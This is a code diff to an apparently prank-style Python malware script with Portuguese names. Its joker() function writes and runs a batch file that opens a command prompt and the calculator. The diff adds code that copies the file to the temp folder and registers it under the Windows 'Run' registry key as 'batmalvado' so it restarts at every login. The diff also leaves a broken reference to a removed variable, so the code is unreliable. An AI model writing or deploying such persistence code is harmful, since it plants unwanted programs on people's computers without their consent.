@@ -42,14 +42,29 @@ def autorun():
 
 
 def joker():
-    path = 'joker.bat'
+    nome = 'joker.bat'
     codigo_bat = '@echo off \nstart cmd \nstart calc'
     with open(path, 'w') as j:
         j.write(codigo_bat)
-    subprocess.run([path], shell=True)        
+        
+    subprocess.run([nome], shell=True)
+    
+    real_path = os.path.realpath(nome)
+    temppath = tempfile.gettempdir()
+    caminho = os.path.join(temppath, os.path.basename(real_path)) 
 
+    try:
+        shutil.copy(real_path, temppath)
+
+        subchave = r'Software\Microsoft\Windows\CurrentVersion\Run'
+        nome = 'batmalvado'
+
+        registro = winreg.OpenKey(winreg.HKEY_CURRENT_USER, subchave, 0, winreg.KEY_SET_VALUE)
+        winreg.SetValueEx(registro, nome, 0, winreg.REG_SZ, caminho)
+    except shutil.SameFileError:
+        None
+        
 
 autorun()
 background()
 joker()
-
